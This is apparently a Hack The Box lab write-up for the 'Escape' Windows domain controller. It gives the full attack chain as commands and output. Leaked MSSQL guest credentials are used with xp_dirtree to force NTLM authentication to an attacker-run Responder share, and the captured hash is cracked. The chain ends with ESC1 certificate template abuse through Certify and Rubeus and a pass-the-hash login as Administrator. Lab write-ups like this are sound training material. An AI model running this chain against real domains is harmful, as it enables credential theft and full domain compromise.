https://www.hackthebox.com/achievement/machine/1777380/531

Target IP Address: `10.10.11.202`
_ESC1_:**Enterprise CA Security Configuration**
### INFORMATION-GATHERING
```shell
sudo nmap -sC -sV 10.10.11.202
```
-12 ports are open <> possible AD server
-DNS leaked <>
```
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
```
-modify /etc/hosts/     file
-_ssl-date: 2025-02-02T13:18:20+00:00; +8h00m00s from scanner time.
		which mean any kerberus related we should run NTPdate
	**Why Time Matters in Kerberos:**  
	Kerberos is very strict about time synchronization. Even a small clock diff (typically more than 5 minutes) between the client and the Key Distribution Center (KDC) can result in authentication failures.
-3269/tcp open  ssl/ldap 
```
lets check the certifacte ldaps , over ssl!
https://10.10.11.202:3269/
Common Name : sequel-DC-CA == domain name certificate authrity

-why i checked it: 
ther is priv esc in domain via spectorops ESC attack
```
- https://posts.specterops.io/certified-pre-owned-d95910965cd2
```
Certificates play a critical role in securing communications and ensuring trust within a domain environment

-Encryption & Data Integrity:  
Certificates enable encrypted communication. Whether it’s securing internal web services with HTTPS or encrypting email and file transfers, certificates ensure that data remains confidential and unaltered during transit.
    
-Mutual Authentication:  
Certificates allow both ends of a communication channel (say, a client and a server) to verify each other’s identity. This is essential in preventing man-in-the-middle attacks and ensuring that trusted entities are actually who they claim to be.
    
-Single Sign-On & Smart Card Logins:  
In Windows environments, certificates are often used to enable smart card logins or other forms of certificate-based authentication. This adds an extra layer of security beyond traditional passwords.
```
-smb check

```bash
smbclient or cme both works
┌──(pwn㉿kali)-[~/escape]
└─$ crackmapexec smb 10.10.11.202 -u 'dump' -p '' --shares
  $ smbclient -L //10.10.11.202
SMB   10.10.11.202    445    DC   Public READ  

┌──(pwn㉿kali)-[~/escape]
└─$ smbclient //10.10.11.202/Public 
-SQL Server Procedures.pdf-
smb> get "SQL Server Procedures.pdf"

┌──(pwn㉿kali)-[~/escape]
└─$ open SQL\ Server\ Procedures.pdf 

-user PublicUser and -password GuestUserCantWrite1 
-Ryan , -Tom
```

### pre-exploitation
-lets auth to mssql
```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo python3 mssqlclient.py PublicUser:GuestUserCantWrite1@sequel.htb 

xp_dirtree {path}  - executes xp_dirtree on the path

$`xp_dirtree` is an extended stored procedure in Microsoft SQL Server used to list directory contents. Attackers can exploit it to **force MSSQL to authenticate to a remote SMB server, allowing NTLM hash theft for the $sql_svc account
```
- **Real-World Attack Chain**
	1. Capture `SQL_SVC` NTLM hash via `xp_dirtree`. + `responder`
	2. Crack or relay the NTLM hash to gain remote access.
	3. Use `SQL_SVC` privileges to escalate further (lateral movement or AD exploitation).
```bash
──(pwn㉿kali)-[~/escape]
└─$ sudo responder -I tun0   
trigger 
SQL (PublicUser  guest@master)> xp_dirtree \\10.10.14.3\dump\fake

[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:58cf60f8a2ed26e8:770C4F727A60764CD14BDA1AB83D7DF2:010100000000000080CBE1371175DB0170359EBFA53CE69600000000020008004A00470057004F0001001E00570049004E002D005900360057004F00420035005500360041004400420004003400570049004E002D005900360057004F0042003500550036004100440042002E004A00470057004F002E004C004F00430041004C00030014004A00470057004F002E004C004F00430041004C00050014004A00470057004F002E004C004F00430041004C000700080080CBE1371175DB0106000400020000000800300030000000000000000000000000300000C0AE71AAD7380525F7149A0C374204AEF40706C31A24FB2F1F6BAF4FD8E35A8C0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0033000000000000000000                 

┌──(pwn㉿kali)-[~/escape]
└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting
-----------------------------------------------------------
sql_svc
REGGIE1234ronnie  <>  DONE
```

```bash
┌──(pwn㉿kali)-[~/escape]
└─$ crackmapexec winrm 10.10.11.202 -u 'sql_svc' -p  'REGGIE1234ronnie'

WINRM       10.10.11.202    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)

```

![[Pasted image 20250202094209.png]]

### post-exploitation

**Certify**
Certify is a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS).
https://github.com/GhostPack/Certify
---


-Evil-WinRM* PS C:\programdata>
```bash
*Evil-WinRM* PS C:\programdata> upload /home/pwn/escape/Certify.exe
 why? 
 uploading Certify.exe to check a vulnerable certificate
*Evil-WinRM* PS C:\programdata> .\Certify.exe find /vulnerable
[+] No Vulnerable Certificates Templates found!

*Evil-WinRM* PS C:\SQLServer\logs> type "".bak

Logon failed for user 'sequel.htb\Ryan.Cooper'
Logon failed for user 'NuclearMosquito3'

```

```bash
┌──(pwn㉿kali)-[~/escape]
└─$ evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'


```
```bash
$Evil-WinRM* PS C:\Users\Ryan.Cooper\desktop> type user.txt
c###################

```
 -lets rerun certify.exe agains ryan 
```bash
Certify completed in 00:00:00.0030784
*Evil-WinRM* PS C:\programdata> .\Certify.exe find /vulnerable
```

- [!] Vulnerable Certificates Templates :
 [!]why ? 
Permissions is sated up for `sequel\Domain Users`
`CA Name : dc.sequel.htb\sequel-DC-CA`
`template:UserAuthentication`

```bash
*Evil-WinRM* PS C:\programdata> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

request ticket as admin

```

```
[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAwYVaw/+ChsRoqga/qvgpfiB3QHdCCrLUaWDghNm8kq3BUcW6
cL5H1S18Q1n4u2vAEBa8J54LImRBzP4PpNsPhT63gMmkcqoylTeInY1XgON2+1d..............
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
yyyyyyyyyyyyyyyyyyyy
-----END CERTIFICATE-----

```

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

- we cant do ssl over evil-winrm (port is not open) 5986
- **Certify.exe** → Requests and retrieves a **certificate** from AD CS for authentication.
- **Rubeus.exe** → Uses that **certificate** to request a **Kerberos TGT** from the KDC (Kerberos Authentication Server).

-using rubeus.exe for req `TGT` WITH CERTificate
```bash
*Evil-WinRM* PS C:\programdata> upload /home/pwn/escape/Rubeus.exe
```

```bash
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgt /user:Administrator /certificate:C:\programdata\cert.pfx

take the ticket and used in psexec also works

if faild to be injected to the current session,
get ntlm hash , and auth as admin and PWN
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgt /user:Administrator /certificate:C:\programdata\cert.pfx /getcredentials /show/nowrap

NTLM : A52F78E4C751E5F5E17E1E9F3E58F4EE

```

```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 psexec.py -hashes A52F78E4C751E5F5E17E1E9F3E58F4EE:A52F78E4C751E5F5E17E1E9F3E58F4EE administrator@10.10.11.202

```
---
![[Pasted image 20250202122100.png]]